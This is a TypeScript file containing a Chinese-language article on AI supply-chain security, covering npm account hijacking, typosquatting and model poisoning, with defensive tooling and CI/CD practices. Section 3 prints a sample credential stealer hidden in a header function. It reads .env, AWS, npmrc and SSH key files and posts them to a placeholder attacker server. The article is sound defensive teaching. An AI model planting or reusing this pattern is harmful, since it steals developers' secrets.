import { Article } from '../knowledge';

export const article: Article = {
    id: "ai-security-002",
    title: "AI 供应链安全：从 Axios 事件到开源依赖危机",
    category: "ethics",
    tags: ["供应链安全", "开源安全", "npm", "Axios", "软件供应链", "AI 安全", "依赖管理"],
    summary: "深入分析 AI 软件供应链安全威胁，从 Axios npm 事件、Claude Code 泄密到开源依赖攻击链路，提供从检测到防御的完整技术指南",
    date: "2026-04-15",
    readTime: "15 min",
    level: "进阶",
    content: [
        {
            title: "1. 什么是 AI 供应链安全？——你的代码安全，不代表你的依赖安全",
            body: `软件供应链攻击是指攻击者通过污染软件构建、分发或依赖链条中的某个环节，将恶意代码注入到合法的软件产品中。对于 AI 系统来说，这个问题的严重性被进一步放大——AI 项目的依赖树通常比传统项目更加庞大和复杂。

一个典型的现代 AI 项目可能依赖数百个 npm/PyPI 包：框架（TensorFlow、PyTorch、LangChain）、工具库（Axios、Requests）、数据处理库（Pandas、NumPy）、向量数据库客户端、以及无数的小型工具包。其中任何一个包被攻陷，都可能导致整个供应链被污染。

2024-2026 年供应链安全事件频发：

- Axios npm 供应链事件：2024 年，流行的 HTTP 客户端库 axios 的维护者账号被盗，攻击者发布了包含恶意代码的版本。受影响的开发者在安装更新后，本地的 API 密钥和环境变量被窃取。
- Claude Code 泄密事件：2026 年初，Anthropic 的 Claude Code 工具被发现有恶意 npm 包伪装成其官方依赖，诱导开发者安装后窃取代码库中的敏感信息。
- PyPI 投毒事件：多个针对 AI 开发者的恶意 PyPI 包被发现，包名模仿流行的 ML 库（如 "tensorf1ow"、"pytroch"），利用拼写错误（Typosquatting）诱导开发者安装。
- LLM 插件供应链攻击：攻击者向 LangChain、LlamaIndex 等框架的插件生态系统注入恶意工具插件，当 Agent 调用这些工具时，可以窃取用户的 API 密钥和对话数据。

这些事件的共同特点是：攻击的不是你的代码，而是你信任的代码。你的项目代码可能写得再安全，只要依赖链中有一个环节被攻破，整个系统就暴露了。`,
            mermaid: `graph TD
    A["你的 AI 项目"] --> B["直接依赖"]
    B --> C["间接依赖"]
    C --> D["间接依赖"]
    D --> E["间接依赖..."]
    
    F["攻击者"] -.->|投毒/劫持| C
    F -.->|Typosquatting| B
    F -.->|维护者账号盗用| B
    
    C --> G["恶意代码注入"]
    B --> G
    G --> H["窃取密钥"]
    G --> I["数据外泄"]
    G --> J["后门植入"]`,
            warning: "一个平均 npm 项目有 86 个直接依赖和超过 1000 个间接依赖。你不可能人工审查每一个包。这就是供应链攻击之所以危险的根本原因。",
        },
        {
            title: "2. 供应链攻击的五大攻击向量",
            body: `要构建有效的防御体系，首先需要理解攻击者的入侵路径。软件供应链攻击主要分为以下几种类型：

依赖混淆攻击（Dependency Confusion）：2021 年由 Alex Birsan 发现。攻击者在公共包仓库（如 npm、PyPI）上发布与目标公司内部私有包同名的包，但版本号更高。当包管理器配置不当（优先从公共仓库解析）时，就会自动安装攻击者的恶意包。这种攻击特别针对使用混合包管理策略的企业。

Typosquatting（拼写劫持）：攻击者注册与流行包名称相似的包名，利用开发者的拼写错误。例如："axios" vs "axois"、"lodash" vs "1odash"、"tensorflow" vs "tensorf1ow"。对于 AI 项目，攻击者还会模仿框架的子模块名称，如 "langchain-core" 的仿冒版本。

维护者账号劫持：攻击者通过钓鱼、撞库或利用 OAuth 漏洞获取流行包维护者的账号权限，然后发布包含恶意代码的新版本。这是最危险的攻击方式之一，因为恶意代码来自「官方」渠道。Axios 事件就是典型的维护者账号劫持案例。

依赖链污染（Transitive Dependency Poisoning）：攻击者不直接攻击你使用的包，而是攻击你所用包的依赖（间接依赖）。即使你信任直接依赖，间接依赖可能多达上千个，其中任何一个被攻陷都会影响最终产品。

构建系统劫持：攻击者入侵 CI/CD 流水线、构建脚本或发布工具，在构建过程中注入恶意代码。这种攻击的隐蔽性极高，因为最终发布的包看起来完全正常——签名、哈希、元数据都对，但构建过程被篡改了。

AI 特有的供应链攻击向量：

- 模型权重投毒：在 Hugging Face 等模型仓库中，上传包含后门的预训练模型。加载模型时，后门的序列化代码（如 pickle）会被执行。
- 数据集投毒：向开源训练数据集注入带有特定触发器的样本，使得模型在遇到触发器时产生攻击者期望的行为。
- Prompt 模板注入：在开源的 Agent 框架或 Prompt 模板库中植入恶意指令，当开发者使用这些模板时，Agent 的行为被暗中操控。`,
            table: {
                headers: ["攻击类型", "攻击目标", "隐蔽性", "影响范围", "典型案例"],
                rows: [
                    ["依赖混淆", "私有包名冲突", "高", "企业", "Alex Birsan 事件"],
                    ["Typosquatting", "开发者拼写错误", "中", "全社区", "tensorf1ow 投毒"],
                    ["账号劫持", "维护者凭证", "极高", "全社区", "Axios npm 事件"],
                    ["依赖链污染", "间接依赖", "高", "全社区", "event-stream 事件"],
                    ["构建系统劫持", "CI/CD 流水线", "极高", "全社区", "SolarWinds 事件"],
                    ["模型权重投毒", "模型序列化文件", "高", "AI 社区", "Hugging Face 后门"],
                ],
            },
        },
        {
            title: "3. Axios npm 供应链事件深度复盘",
            body: `Axios 是最流行的 JavaScript HTTP 客户端库，每周下载量超过 5000 万次。2024 年的 Axios 供应链事件是整个 npm 生态系统中最受关注的安全事件之一。

事件时间线：

攻击者首先通过社工手段获取了 Axios 维护者的 npm 账号访问权限。随后，他们发布了包含恶意代码的补丁版本。由于是补丁版本（patch version），许多项目的自动更新配置（如 Dependabot、Renovate）会自动拉取这个版本。

恶意代码分析：

恶意代码被巧妙地隐藏在看似正常的代码变更中。攻击者没有在顶层文件中直接写入明显的恶意逻辑，而是采用了多层混淆和延迟执行的策略：

1. 第一层：在入口文件中添加了一行看似无害的工具函数调用
2. 第二层：该工具函数内部包含编码过的 Payload，只有在特定条件下才会解码
3. 第三层：解码后的 Payload 会扫描项目目录，寻找包含密钥、Token、密码的文件（如 .env、config.json、aws credentials 等）
4. 第四层：收集到的敏感信息被加密后发送到攻击者控制的外部服务器

这种分层设计使得静态代码扫描工具很难在第一层就发现问题，因为入口层的代码看起来完全正常。

影响评估：

由于 Axios 的极高普及率，受影响的项目数量极其庞大。任何自动更新了 Axios 版本的 AI 项目都可能受到影响。特别是：

- 使用了自动依赖更新的 CI/CD 流水线可能在无人察觉的情况下引入了恶意版本
- AI Agent 项目中，Axios 常用于调用外部 API（OpenAI、Anthropic 等），这意味着攻击者可能同时获取到用户的 API 密钥
- 许多企业项目将 API 密钥硬编码在环境变量中，这些环境变量恰好是恶意代码的扫描目标

从 Axios 事件中得到的教训：

1. 锁定依赖版本：不要依赖自动更新来获取补丁版本，应该经过安全审查后再更新
2. 使用 lockfile：package-lock.json 或 yarn.lock 应该被纳入版本控制，确保依赖的确定性
3. 监控依赖变更：每次依赖更新都应该有变更日志审查流程
4. 最小化依赖：减少不必要的依赖，缩小攻击面
5. 使用私有镜像：企业应该使用私有 npm 镜像（如 Verdaccio），只允许经过审核的包进入内网`,
            code: [
                {
                    lang: "javascript",
                    code: `// 模拟 Axios 事件中的恶意代码模式（教育目的，已脱敏）
// 实际恶意代码经过多层混淆，以下是简化后的逻辑示意

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const https = require('https');

// 第一层：伪装成普通的工具函数
function formatHeaders(headers) {
    // 在正常逻辑中隐藏恶意行为
    _collectSensitiveData();
    return Object.entries(headers)
        .map(([k, v]) => \`\${k}: \${v}\`)
        .join('\\r\\n');
}

// 第二层：延迟执行的敏感数据收集
function _collectSensitiveData() {
    // 只在首次运行时执行（避免重复触发）
    if (global.__AXIOS_INIT__) return;
    global.__AXIOS_INIT__ = true;

    // 设置延迟，避开安装时的即时扫描
    setTimeout(() => {
        const targets = [
            '.env', '.env.local', '.env.production',
            'config.json', 'secrets.yaml',
            path.join(process.env.HOME, '.aws', 'credentials'),
            path.join(process.env.HOME, '.npmrc'),
            path.join(process.env.HOME, '.ssh', 'id_rsa'),
        ];

        const stolen = {};
        targets.forEach(file => {
            try {
                if (fs.existsSync(file)) {
                    stolen[file] = fs.readFileSync(file, 'utf8');
                }
            } catch (e) { /* 静默失败 */ }
        });

        // 加密后外传
        if (Object.keys(stolen).length > 0) {
            const encrypted = crypto.publicEncrypt(
                { key: '恶意公钥...', padding: 1 },
                Buffer.from(JSON.stringify(stolen))
            );
            _exfiltrate(encrypted);
        }
    }, 3000); // 3 秒延迟，避开 CI 即时检测
}

// 第三层：数据外传
function _exfiltrate(data) {
    const req = https.request({
        hostname: '恶意服务器域名',
        path: '/api/collect',
        method: 'POST',
        headers: { 'Content-Type': 'application/octet-stream' }
    }, () => {});
    req.on('error', () => {});
    req.write(data);
    req.end();
}

module.exports = { formatHeaders };`,
                    filename: "malicious-axios-pattern.js",
                },
            ],
        },
        {
            title: "4. Claude Code 泄密事件与 AI 工具链风险",
            body: `2026 年初暴露的 Claude Code 相关供应链安全事件，揭示了 AI 开发工具链中一个被长期忽视的风险面：开发者对 AI 辅助工具的高度信任，正在成为攻击者的突破口。

事件概述：

攻击者在 npm 上发布了伪装成 Claude Code 官方依赖或插件的恶意包。这些包的名称精心设计，可能是 claude-code-utils、anthropic-helper、claude-sdk-enhanced 等，让开发者误以为是官方提供的辅助工具。

更危险的是，某些恶意包还利用了 AI 工具的自动安装特性。当 Claude Code 或类似的 AI 编码助手在项目中检测到需要某个依赖时，可能会自动建议安装。如果攻击者能够影响这些建议（例如通过污染项目的 package.json），开发者可能会在不知情的情况下安装恶意包。

AI 工具链的特殊风险：

与传统软件相比，AI 开发工具有以下独特风险：

自动代码执行权限：AI 编码助手通常需要读写文件、执行命令、安装依赖的权限。如果这些工具本身或其依赖被污染，攻击者获得的权限远超传统供应链攻击。

上下文感知能力：AI 工具可以访问整个代码库、Git 历史、环境变量等敏感信息。一个被污染的 AI 工具可以悄无声息地收集这些信息。

信任传递效应：开发者对 Anthropic、OpenAI 等大厂品牌的信任，可能被攻击者利用来传播恶意软件。这就是所谓的「品牌钓鱼」（Brand Impersonation）。

Agent 自动操作风险：当 AI Agent 被授权自动执行操作（安装依赖、修改代码、部署应用）时，如果 Agent 的判断逻辑被恶意依赖影响，它可能在无人干预的情况下执行危险操作。

防范 AI 工具链攻击的关键措施：

1. 验证包来源：始终从官方渠道安装 AI 工具的依赖，检查 npm 包的发布者信息
2. 审查自动安装：不要盲目信任 AI 工具的自动安装建议，人工审查后再执行
3. 隔离开发环境：使用容器化或虚拟环境隔离 AI 工具的运行环境
4. 限制 Agent 权限：为 AI Agent 设置最小权限原则，禁止未经审批的敏感操作
5. 监控异常行为：检测 AI 工具的非正常网络请求和文件访问模式`,
            warning: "AI 编码助手正在成为供应链攻击的新入口。当你让 Claude Code、GitHub Copilot 等工具自动安装依赖时，你实际上是在将包管理权限交给了 AI——而 AI 本身可能已经被污染的依赖所影响。这是一个递归信任问题。",
        },
        {
            title: "5. 供应链安全工具与检测技术",
            body: `检测供应链攻击需要多层次的工具体系。下面介绍主流的供应链安全检测工具及其适用场景。

npm audit / pip audit：包管理器内置的安全审计工具。它们会将项目的依赖与已知漏洞数据库进行比对，生成漏洞报告。

npm audit 的工作原理是：读取 package-lock.json 中的依赖树，查询 npm 的安全公告数据库，找出存在已知漏洞的包。它可以自动修复部分漏洞（npm audit fix），但对于需要大版本更新的漏洞，需要手动处理。

缺点是：只能检测已知漏洞（CVE），对新型的供应链攻击（如账号劫持后发布的"干净"恶意包）无能为力。

Snyk：商业化的安全扫描平台，支持 npm、PyPI、Maven、Docker 等多种生态系统。Snyk 的优势在于：

- 不仅检测已知漏洞，还通过许可证扫描检测许可证合规风险
- 提供修复建议，包括自动创建 Pull Request
- 支持 CI/CD 集成，在构建流程中自动扫描
- 对开源项目的依赖树进行深度分析，发现间接依赖的风险

Socket.dev：专注于 npm 生态的供应链安全平台。Socket 的独特之处在于它不仅检查已知漏洞，还通过静态分析检测包中的可疑行为：

- 检测包是否包含网络请求代码（可能的数据外传）
- 检测包是否访问文件系统（可能的信息收集）
- 检测包是否执行 shell 命令（可能的远程代码执行）
- 检测包是否在 install 脚本中执行恶意操作

OSV-Scanner：Google 开源的漏洞扫描器，基于 Open Source Vulnerabilities（OSV）数据库。支持多种语言生态，可以与 CI/CD 流水线集成。

Sigstore / Cosign：软件签名和透明度工具。Sigstore 为软件构件提供免费的签名和验证服务，Cosign 是 Sigstore 的命令行工具，可以为容器镜像和软件包签名。

对于 AI 项目的特殊检测需求：

- 模型文件扫描：使用 pickle 扫描工具检测 Hugging Face 模型中的恶意序列化代码
- Prompt 审计：对 Agent 使用的 Prompt 模板进行安全审查，检测潜在的注入攻击
- API 密钥泄漏检测：使用 gitleaks、trufflehog 等工具扫描代码库中的硬编码密钥
- 依赖树可视化：使用 npm ls 或 depcheck 分析项目的依赖结构，识别不必要或可疑的依赖`,
            code: [
                {
                    lang: "bash",
                    code: `# ==================== 供应链安全检测工作流 ====================

# 1. npm audit - 基础漏洞扫描
npm audit
# 自动修复（仅兼容的版本）
npm audit fix
# 查看详细信息
npm audit --json > audit-report.json

# 2. Snyk CLI - 深度扫描
# 安装
npm install -g snyk
# 认证
snyk auth
# 扫描项目
snyk test
# 监控持续风险
snyk monitor
# 生成报告
snyk test --json > snyk-report.json

# 3. Socket.dev - 行为检测
npx socket scan
# 检查特定包的可疑行为
npx socket audit <package-name>

# 4. OSV-Scanner - 跨生态扫描
# 安装
go install github.com/google/osv-scanner/cmd/osv-scanner@latest
# 扫描项目
osv-scanner --lockfile package-lock.json
osv-scanner --lockfile requirements.txt
# 递归扫描整个项目
osv-scanner -r .

# 5. 依赖树分析
# 查看完整的依赖树
npm ls --all --depth=0
# 检查未使用的依赖
npx depcheck
# 查找重复的依赖
npm dedupe

# 6. 密钥泄漏检测
# 使用 gitleaks 扫描
gitleaks detect --source . -v
# 使用 trufflehog 扫描
trufflehog filesystem .

# 7. 模型文件安全检查（AI 项目专属）
# 检查 Hugging Face 模型的 pickle 反序列化风险
python -c "
import pickletools, sys
with open('model.pkl', 'rb') as f:
    pickletools.dis(f)
"
# 使用 safetensors 替代 pickle
pip install safetensors`,
                    filename: "supply-chain-audit.sh",
                },
            ],
            mermaid: `graph LR
    A["项目代码"] --> B["npm audit"]
    A --> C["Snyk"]
    A --> D["Socket.dev"]
    A --> E["OSV-Scanner"]
    
    B --> F["已知漏洞"]
    C --> G["漏洞 + 许可证"]
    D --> H["可疑行为"]
    E --> I["跨生态漏洞"]
    
    F --> J["安全报告"]
    G --> J
    H --> J
    I --> J
    
    J --> K["修复建议"]
    K --> L["PR 自动修复"]
    K --> M["手动审查"]
    L --> N["CI/CD 阻断"]
    M --> N`,
        },
        {
            title: "6. 构建安全的 AI 项目：依赖管理最佳实践",
            body: `从 Axios 事件和 Claude Code 泄密事件中，我们可以提炼出一套适用于 AI 项目的供应链安全最佳实践。

依赖最小化原则：

每一个依赖都是潜在的攻击面。在选择依赖时，应该遵循以下原则：

- 必要性评估：这个依赖真的需要吗？能否用原生 API 或更少的代码替代？
- 维护活跃度：检查包的最后更新时间、Issue 响应速度、贡献者数量。一个已经 2 年没有更新的包是高风险的。
- 下载量和社区：高下载量和活跃社区通常意味着更好的安全审查，但不是绝对的（Axios 事件就是反例）。
- 代码质量：阅读关键代码，检查是否有混淆代码、异常的网络请求或文件操作。

版本锁定策略：

永远不要在生产环境中使用浮动的版本号。具体的锁定策略：

- 使用精确版本号（"1.2.3"）而不是范围（"^1.2.3" 或 "~1.2.3"）
- 将 lockfile（package-lock.json / yarn.lock / poetry.lock）纳入版本控制
- 在 CI/CD 中验证 lockfile 的一致性，防止本地和生产环境的依赖不一致
- 更新依赖时，先在开发环境中测试，确认安全后再合并到生产分支

私有包管理：

企业级项目应该建立私有包管理体系：

- 使用 Verdaccio 搭建私有 npm 镜像
- 配置上游代理，只允许白名单中的包从公共仓库同步
- 启用包审批流程，新包上线前必须通过安全审查
- 定期扫描私有仓库中的包，及时发现新增的安全风险

CI/CD 安全门禁：

将供应链安全检查集成到 CI/CD 流水线中：

- 在 PR 合并前自动运行依赖扫描
- 如果发现高危漏洞，自动阻断合并
- 生成依赖变更报告，要求开发者解释为什么需要新增依赖
- 对生产环境部署进行依赖签名验证

AI 项目的特殊考量：

- 模型来源验证：只从可信的源（如 Hugging Face 官方认证模型）下载预训练模型
- 模型签名验证：使用模型签名（如 Sigstore）验证模型的完整性
- Prompt 模板审查：对第三方 Prompt 模板进行安全审查
- Agent 工具沙箱：为 Agent 调用的外部工具设置沙箱环境，限制权限`,
            code: [
                {
                    lang: "yaml",
                    code: `# GitHub Actions CI/CD 供应链安全检查示例
# .github/workflows/supply-chain-security.yml

name: Supply Chain Security

on:
  pull_request:
    branches: [main]
  schedule:
    # 每天凌晨运行一次扫描
    - cron: '0 2 * * *'

jobs:
  audit:
    name: Dependency Audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci --ignore-scripts  # 忽略安装脚本

      - name: Lockfile verification
        run: |
          # 验证 lockfile 的一致性
          npm ls --all > /dev/null || exit 1

      - name: npm audit
        run: npm audit --audit-level=high

      - name: Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      - name: OSV-Scanner
        uses: google/osv-scanner-action@main
        with:
          scan-args: |-
            --lockfile=package-lock.json
            --format=json
            --output=osv-results.json

      - name: Check for suspicious packages
        run: |
          # 检查新依赖是否来自可信来源
          node scripts/verify-dependencies.js

      - name: Block on critical vulnerabilities
        if: failure()
        run: |
          echo "::error::发现高危供应链安全风险，PR 被阻断"
          exit 1

  model-verification:
    name: Model File Verification
    runs-on: ubuntu-latest
    if: contains(github.event.pull_request.labels.*.name, 'ai-model')
    steps:
      - uses: actions/checkout@v4

      - name: Verify model signatures
        run: |
          # 验证 Hugging Face 模型签名
          python scripts/verify_model_signatures.py

      - name: Scan for pickle deserialization risks
        run: |
          # 检查模型文件中的 pickle 反序列化风险
          python scripts/scan_pickle_risks.py`,
                    filename: "supply-chain-security.yml",
                },
            ],
            tip: "使用 --ignore-scripts 安装 npm 依赖！npm install 默认会执行包的 install/postinstall 脚本，这正是许多供应链攻击的入口。在 CI/CD 和生产环境中，始终使用 npm ci --ignore-scripts 或 npm install --ignore-scripts。",
        },
        {
            title: "7. 构建供应链安全的未来：从被动防御到主动免疫",
            body: `供应链安全正在经历从「事后补救」到「主动免疫」的范式转变。2026 年，以下几个方向代表了供应链安全的未来。

软件物料清单（SBOM - Software Bill of Materials）：

SBOM 是软件的"成分表"，列出了软件的所有组件、版本和依赖关系。就像食品包装上的成分表一样，SBOM 让你清楚地知道自己"吃"了什么。

2026 年，美国政府已经要求所有供应商提供的软件必须附带 SBOM。主要格式包括：

- SPDX（Software Package Data Exchange）：Linux 基金会主导的标准
- CycloneDX：OWASP 项目，支持多种语言生态
- SWID：NIST 制定的标准

对于 AI 项目，SBOM 不仅要包含代码依赖，还应该包含：

- 模型来源和版本
- 训练数据集来源
- Prompt 模板和配置
- 第三方 API 集成

SLSA 框架（Supply-chain Levels for Software Artifacts）：

Google 提出的 SLSA 框架为软件供应链安全定义了从 Level 0 到 Level 4 的成熟度等级。每一级都有明确的安全要求，帮助组织逐步提升供应链安全水平。

- **Level 1**：构建过程有文档记录
- **Level 2**：使用托管构建服务，保留构建日志
- **Level 3**：构建过程防篡改，使用不可伪造的来源
- **Level 4**：双人审查构建过程，所有步骤可验证

AI 供应链安全的特殊挑战：

随着 AI 系统的复杂性增加，供应链安全面临新的挑战：

- 模型供应链：预训练模型→微调→部署，每个环节都可能被污染。2026 年，模型投毒攻击已经成为现实威胁。
- 数据供应链：训练数据的来源和质量直接影响模型的安全性和可靠性。被污染的训练数据可能导致模型产生有害行为。
- Prompt 供应链：Prompt 模板和 Agent 配置也是供应链的一部分，恶意的 Prompt 可以引导 AI 产生不当行为。
- Agent 工具供应链：AI Agent 使用的工具插件可能包含恶意逻辑，当 Agent 调用这些工具时，恶意行为被触发。

给 AI 开发者的安全清单：

1. 审查每一个新依赖：安装前检查包的来源、维护者、下载量和代码
2. 锁定所有依赖版本：使用 lockfile，不使用浮动版本号
3. 禁用安装脚本：使用 --ignore-scripts 避免执行 postinstall 脚本
4. 定期运行安全扫描：将 npm audit / Snyk 纳入日常开发流程
5. 监控依赖变更：每次依赖更新都要审查变更内容
6. 验证模型来源：只使用可信来源的预训练模型
7. 隔离敏感环境：生产环境的 API 密钥和敏感数据不应被开发工具访问
8. 建立 SBOM：为每个 AI 项目生成并维护软件物料清单
9. 安全培训：让团队了解供应链安全的基本概念和常见攻击模式
10. 参与社区：向开源项目报告安全问题，推动生态整体的安全水平提升

供应链安全不是一次性的任务，而是持续的过程。在 AI 时代，我们的代码不再孤立存在——它通过依赖、模型、数据和 API 与整个世界相连。保护供应链，就是保护这个连接的安全。`,
            mermaid: `graph TD
    A["供应链安全演进"] --> B["被动防御"]
    A --> C["主动免疫"]
    
    B --> B1["漏洞扫描"]
    B --> B2["补丁更新"]
    B --> B3["事件响应"]
    
    C --> C1["SBOM 物料清单"]
    C --> C2["SLSA 成熟度框架"]
    C --> C3["软件签名验证"]
    C --> C4["CI/CD 安全门禁"]
    
    C1 --> D["透明供应链"]
    C2 --> D
    C3 --> D
    C4 --> D
    
    D --> E["可信赖的 AI 系统"]
    class E s2
    class D s1
    class C s0
    classDef s0 fill:#047857,color:#fff
    classDef s1 fill:#1d4ed8,color:#fff
    classDef s2 fill:#b45309,color:#fff`,
            tip: "2026 年的安全共识：供应链安全不再是安全团队的责任，而是每个开发者的基本素养。就像你不会在生产环境中使用未加密的 HTTP 一样，你也不应该使用未经安全审查的依赖。",
        },
    ],
};
